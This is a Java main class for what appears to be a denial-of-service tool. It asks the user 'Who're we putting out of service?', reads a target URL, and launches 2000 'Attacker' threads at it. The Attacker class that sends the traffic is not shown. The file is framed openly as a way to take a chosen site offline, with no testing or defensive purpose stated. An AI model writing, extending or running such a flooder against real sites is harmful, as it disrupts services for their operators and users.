package com.company;

import java.io.UnsupportedEncodingException;
import java.net.MalformedURLException;
import java.util.Scanner;

public class Main {

    public static void main(String[] args) {
	// write your code here
        System.out.println("Who're we putting out of service?\n>");
        String url = new Scanner(System.in).nextLine();
        for(int i=0;i<2000;i++){
            new Attacker(url,"Thread "+i).start();
        }
    }
}
